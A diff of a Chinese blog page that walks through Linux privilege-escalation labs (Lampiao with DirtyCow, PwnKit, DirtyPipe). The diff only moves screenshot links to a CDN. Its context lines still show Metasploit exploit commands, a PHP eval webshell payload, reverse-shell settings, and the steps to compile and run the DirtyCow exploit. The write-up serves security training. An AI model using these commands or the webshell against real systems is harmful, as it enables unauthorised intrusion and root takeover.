@@ -277,7 +277,7 @@
 </span></span><span style="display:flex;"><span>cat /proc/version
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>dmesg | grep <span style="color:#e6db74">&#34;Linux version&#34;</span>
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 173946.png" alt="屏幕截图 2025-10-25 173946.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 173946.png" alt="屏幕截图 2025-10-25 173946.png"></p>
 <hr>
 <h2 id="二内核漏洞筛选思路">二、内核漏洞筛选思路</h2>
 <h3 id="1-metasploit-模块检测">1️⃣ Metasploit 模块检测</h3>
@@ -353,19 +353,19 @@
 <a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p>
 <h3 id="-信息收集">② 信息收集</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p1-65535 192.168.88.0/24
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 164110.png" alt="屏幕截图 2025-10-25 164110.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 164110.png" alt="屏幕截图 2025-10-25 164110.png"></p>
 <h3 id="-web-漏洞利用">③ Web 漏洞利用</h3>
 <p>发现 CMS</p>
-<p align="center"><img src="/static/Pasted image 20251025164212.png" alt="Pasted image 20251025164212.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted image 20251025164212.png" alt="Pasted image 20251025164212.png"></p>
 <p>使用历史漏洞：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search drupal
 </span></span><span style="display:flex;"><span>use exploit/unix/webapp/drupal_drupalgeddon2
 </span></span><span style="display:flex;"><span>set rhost 192.168.46.144
 </span></span><span style="display:flex;"><span>set rport 1898
 </span></span><span style="display:flex;"><span>run
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 164303.png" alt="屏幕截图 2025-10-25 164303.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 164303.png" alt="屏幕截图 2025-10-25 164303.png"></p>
 <p>成功获取权限</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 164341.png" alt="屏幕截图 2025-10-25 164341.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 164341.png" alt="屏幕截图 2025-10-25 164341.png"></p>
 <h3 id="-内核漏洞检测">④ 内核漏洞检测</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/linux-exploit-suggester.sh /tmp/1.sh
 </span></span><span style="display:flex;"><span>shell
@@ -373,25 +373,25 @@
 </span></span><span style="display:flex;"><span>chmod +x 1.sh
 </span></span><span style="display:flex;"><span>./1.sh
 </span></span></code></pre></div><p><code>linpeas</code> 扫描</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 165014.png" alt="屏幕截图 2025-10-25 165014.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 165014.png" alt="屏幕截图 2025-10-25 165014.png"></p>
 <p><code>linux-exploit-suggester.sh</code></p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 165535.png" alt="屏幕截图 2025-10-25 165535.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 165535.png" alt="屏幕截图 2025-10-25 165535.png"></p>
 <p>重点观察 <strong>红色/醒目提示项</strong>。</p>
 <h3 id="-获取-exploit-代码">⑤ 获取 exploit 代码</h3>
 <p>来源：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/gbonacini/CVE-2016-5195
 </span></span></code></pre></div><p>上传 exploit：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/dcow.cpp /tmp/dcow.cpp
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 165954.png" alt="屏幕截图 2025-10-25 165954.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 165954.png" alt="屏幕截图 2025-10-25 165954.png"></p>
 <p>编译：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 170116.png" alt="屏幕截图 2025-10-25 170116.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 170116.png" alt="屏幕截图 2025-10-25 170116.png"></p>
 <p>执行提权：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
 </span></span><span style="display:flex;"><span>./dcow
 </span></span><span style="display:flex;"><span>su root
 </span></span></code></pre></div><p>成功截图：</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 170208.png" alt="屏幕截图 2025-10-25 170208.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 170208.png" alt="屏幕截图 2025-10-25 170208.png"></p>
 <hr>
 <h2 id="六内核溢出---pwnkitcve-2021-4034">六、内核溢出 - Pwnkit（CVE-2021-4034）</h2>
 <p>靶场环境：
@@ -411,7 +411,7 @@
 </span></span><span style="display:flex;"><span>cd /tmp
 </span></span><span style="display:flex;"><span>chmod +x 1.sh
 </span></span><span style="display:flex;"><span>./1.sh
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 174146.png" alt="屏幕截图 2025-10-25 174146.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 174146.png" alt="屏幕截图 2025-10-25 174146.png"></p>
 <p>搜索模块：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search cve_2021_4034
 </span></span></code></pre></div><p>利用：</p>
@@ -419,8 +419,8 @@
 </span></span><span style="display:flex;"><span>set session x
 </span></span><span style="display:flex;"><span>run
 </span></span></code></pre></div><p>成功截图：</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 174621.png" alt="屏幕截图 2025-10-25 174621.png"></p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 174644.png" alt="屏幕截图 2025-10-25 174644.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 174621.png" alt="屏幕截图 2025-10-25 174621.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 174644.png" alt="屏幕截图 2025-10-25 174644.png"></p>
 <hr>
 <h2 id="七内核溢出---dirtypipecve-2022-0847">七、内核溢出 - DirtyPipe（CVE-2022-0847）</h2>
 <p>靶场环境：
@@ -430,7 +430,7 @@
 </span></span></code></pre></div><h3 id="-web-漏洞利用-2">② Web 漏洞利用</h3>
 <p>目录扫描：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://192.168.88.140/ -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 175519.png" alt="屏幕截图 2025-10-25 175519.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 175519.png" alt="屏幕截图 2025-10-25 175519.png"></p>
 <p>抓包写 WebShell：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>message=&lt;?php eval($_POST[&#34;pass&#34;]);?&gt;&amp;file=xd.php
 </span></span></code></pre></div><p>反弹 Shell：</p>
@@ -439,7 +439,7 @@
 </span></span><span style="display:flex;"><span>set lhost 0.0.0.0
 </span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">6666</span>
 </span></span><span style="display:flex;"><span>run
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 180059.png" alt="屏幕截图 2025-10-25 180059.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 180059.png" alt="屏幕截图 2025-10-25 180059.png"></p>
 <h3 id="-本地提权-1">③ 本地提权</h3>
 <p>上传：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>upload /root/linux-exploit-suggester.sh /tmp/1.sh
@@ -447,16 +447,16 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd /tmp
 </span></span><span style="display:flex;"><span>chmod +x 1.sh
 </span></span><span style="display:flex;"><span>./1.sh
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 180208.png" alt="屏幕截图 2025-10-25 180208.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 180208.png" alt="屏幕截图 2025-10-25 180208.png"></p>
 <p>使用 MSF：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>search cve_2022_0847
 </span></span><span style="display:flex;"><span>use exploit/linux/local/cve_2022_0847_dirtypipe
 </span></span><span style="display:flex;"><span>set session x
 </span></span><span style="display:flex;"><span>set lhost xx.xx.xx.xx
 </span></span><span style="display:flex;"><span>run
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-25 180612.png" alt="屏幕截图 2025-10-25 180612.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 180612.png" alt="屏幕截图 2025-10-25 180612.png"></p>
 <p>成功截图：</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-25 180711.png" alt="屏幕截图 2025-10-25 180711.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-25 180711.png" alt="屏幕截图 2025-10-25 180711.png"></p>
 <hr>
 <h2 id="八补充参考">八、补充参考</h2>
 <ul>
